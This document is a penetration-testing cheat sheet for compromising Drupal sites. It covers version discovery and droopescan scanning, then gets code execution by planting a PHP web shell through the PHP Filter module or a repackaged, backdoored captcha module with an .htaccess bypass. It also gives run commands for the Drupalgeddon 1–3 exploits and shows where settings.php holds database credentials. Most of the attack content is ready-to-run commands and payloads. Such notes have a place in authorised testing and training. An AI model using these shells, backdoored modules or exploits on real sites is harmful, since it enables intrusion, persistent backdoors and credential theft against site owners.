# Drupal

## Discovery

```bash
# Meta tag
curl -s http://TARGET | grep 'Generator.*Drupal'

# CHANGELOG.txt (version)
curl -s http://TARGET/CHANGELOG.txt | head

# Node-based URLs (common indicator)
/node/1
/node/2

# Login page
/user/login
```

---

## Enumeration Tools

### droopescan

```bash
# Install
pip install droopescan

# Scan
droopescan scan drupal -u http://TARGET
```

---

## PHP Filter Module RCE (Drupal < 8)

1. Login as admin
2. Enable PHP Filter: `Modules → PHP Filter → Save`
3. Create content: `Content → Add content → Basic page`
4. Add PHP shell in body:

```php
<?php system($_GET['cmd']); ?>
```

5. Set `Text format` to `PHP code`
6. Save and access:

```bash
curl http://TARGET/node/3?cmd=id
```

---

## PHP Filter Module (Drupal 8+)

Module not installed by default. Upload manually:

```bash
# Download module
wget https://ftp.drupal.org/files/projects/php-8.x-1.1.tar.gz

# Upload via: Administration → Reports → Available updates
# Then enable and use as above
```

---

## Backdoored Module Upload

### Create Malicious Module

```bash
# Download legit module
wget https://ftp.drupal.org/files/projects/captcha-8.x-1.2.tar.gz
tar xvf captcha-8.x-1.2.tar.gz

# Create shell.php
echo '<?php system($_GET["cmd"]); ?>' > captcha/shell.php

# Create .htaccess (bypass /modules protection)
cat > captcha/.htaccess << 'EOF'
<IfModule mod_rewrite.c>
RewriteEngine On
RewriteBase /
</IfModule>
EOF

# Repackage
tar cvf captcha.tar.gz captcha/
```

### Upload and Execute

1. `Manage → Extend → + Install new module`
2. Upload `captcha.tar.gz`
3. Access shell:

```bash
curl http://TARGET/modules/captcha/shell.php?cmd=id
```

---

## Drupalgeddon (CVE-2014-3704)

**Affects:** Drupal 7.0 - 7.31

Pre-auth SQLi to create admin user:

```bash
# Exploit
python2.7 drupalgeddon.py -t http://TARGET -u hacker -p hacker

# Then login and enable PHP Filter for RCE
```

**PoC:** https://www.exploit-db.com/exploits/34992

---

## Drupalgeddon2 (CVE-2018-7600)

**Affects:** Drupal < 7.58, < 8.5.1

Unauthenticated RCE:

```bash
# Ruby exploit
ruby drupalgeddon2.rb http://TARGET

# Python exploit
python3 drupalgeddon2.py http://TARGET -c 'id'
```

**PoC:** https://github.com/dreadlocked/Drupalgeddon2

---

## Drupalgeddon3 (CVE-2018-7602)

**Affects:** Drupal 7.x, 8.x

Authenticated RCE (requires any user account):

```bash
python3 drupalgeddon3.py http://TARGET username password 'id'
```

---

## Important Paths

| Path | Description |
|------|-------------|
| `/sites/default/settings.php` | DB credentials |
| `/sites/default/files/` | Uploaded files |
| `/modules/` | Modules directory |
| `/CHANGELOG.txt` | Version info |
| `/user/login` | Login page |
| `/admin` | Admin panel |

---

## Config File Location

```bash
# Database credentials
/sites/default/settings.php

# Contains:
$databases['default']['default'] = array(
  'database' => 'drupal',
  'username' => 'drupaluser',
  'password' => 'password123',
);
```
